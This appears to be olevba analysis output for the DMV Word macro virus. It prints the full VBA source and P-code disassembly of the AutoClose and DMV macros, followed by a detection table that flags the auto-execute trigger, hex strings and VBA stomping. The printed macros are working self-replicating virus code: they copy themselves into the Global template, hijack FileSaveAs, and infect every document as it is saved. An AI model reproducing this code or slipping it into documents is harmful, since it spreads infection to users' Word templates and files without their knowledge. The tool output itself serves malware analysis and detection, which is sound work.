olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Dmv
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Dmv - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: ./Virus.MSWord.Dmv - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim iMacroCount
Dim i
Dim binstalled
Dim bTooMuchTrouble
Dim sMe$
Dim sMacro$
'just to prove another point
On Error GoTo -1: On Error GoTo Abort
iMacroCount = WordBasic.CountMacros(0, 0)
'see we're already installed
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0, 0) = "DMV" Then
        binstalled = -1
    End If
    If WordBasic.[MacroName$](i, 0, 0) = "FileSaveAs" Then
        bTooMuchTrouble = -1
    End If
Next i
If Not binstalled And Not bTooMuchTrouble Then
    'add FileSaveAs and copies of FileSaveAs and AutoClose
    'DMV is just for more fun
    sMe$ = WordBasic.[FileName$]()
    sMacro$ = sMe$ + ":DMV"
    WordBasic.MacroCopy sMacro$, "Global:FileSaveAs"
    sMacro$ = sMe$ + ":AutoClose"
    WordBasic.MacroCopy sMacro$, "Global:DMV"
    WordBasic.MsgBox "               DMV               ", 1
End If
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO DMV.bas 
in file: ./Virus.MSWord.Dmv - OLE stream: 'Macros/VBA/DMV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
'just to prove another point
'this becomes the FileSaveAs for the original template
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Bail
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":AutoClose"
WordBasic.MacroCopy "Global:DMV", sTMacro$
sTMacro$ = sMe$ + ":DMV"
WordBasic.MacroCopy "Global:FileSaveAs", sTMacro$
WordBasic.FileSaveAs dlg
GoTo Done

Bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Dmv
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoClose - 3057 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn iMacroCount
' Line #3:
' 	Dim 
' 	VarDefn i
' Line #4:
' 	Dim 
' 	VarDefn binstalled
' Line #5:
' 	Dim 
' 	VarDefn bTooMuchTrouble
' Line #6:
' 	Dim 
' 	VarDefn sMe
' Line #7:
' 	Dim 
' 	VarDefn sMacro
' Line #8:
' 	QuoteRem 0x0000 0x001B "just to prove another point"
' Line #9:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Abort 
' Line #10:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #11:
' 	QuoteRem 0x0000 0x001B "see we're already installed"
' Line #12:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #13:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0003 "DMV"
' 	Eq 
' 	IfBlock 
' Line #14:
' 	LitDI2 0x0001 
' 	UMi 
' 	St binstalled 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x000A "FileSaveAs"
' 	Eq 
' 	IfBlock 
' Line #17:
' 	LitDI2 0x0001 
' 	UMi 
' 	St bTooMuchTrouble 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	Ld binstalled 
' 	Not 
' 	Ld bTooMuchTrouble 
' 	Not 
' 	And 
' 	IfBlock 
' Line #21:
' 	QuoteRem 0x0004 0x0035 "add FileSaveAs and copies of FileSaveAs and AutoClose"
' Line #22:
' 	QuoteRem 0x0004 0x0018 "DMV is just for more fun"
' Line #23:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #24:
' 	Ld sMe$ 
' 	LitStr 0x0004 ":DMV"
' 	Add 
' 	St sMacro$ 
' Line #25:
' 	Ld sMacro$ 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #26:
' 	Ld sMe$ 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	St sMacro$ 
' Line #27:
' 	Ld sMacro$ 
' 	LitStr 0x000A "Global:DMV"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #28:
' 	LitStr 0x0021 "               DMV               "
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	Label Abort 
' Line #31:
' 	EndSub 
' Macros/VBA/DMV - 2022 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn sMe
' Line #3:
' 	Dim 
' 	VarDefn sTMacro
' Line #4:
' 	QuoteRem 0x0000 0x001B "just to prove another point"
' Line #5:
' 	QuoteRem 0x0000 0x0035 "this becomes the FileSaveAs for the original template"
' Line #6:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #7:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Bail 
' Line #8:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #9:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #10:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #11:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #12:
' 	Ld sMe$ 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	St sTMacro$ 
' Line #13:
' 	LitStr 0x000A "Global:DMV"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #14:
' 	Ld sMe$ 
' 	LitStr 0x0004 ":DMV"
' 	Add 
' 	St sTMacro$ 
' Line #15:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #16:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #17:
' 	GoTo Done 
' Line #18:
' Line #19:
' 	Label Bail 
' Line #20:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Ne 
' 	IfBlock 
' Line #21:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	Label Done 
' Line #24:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

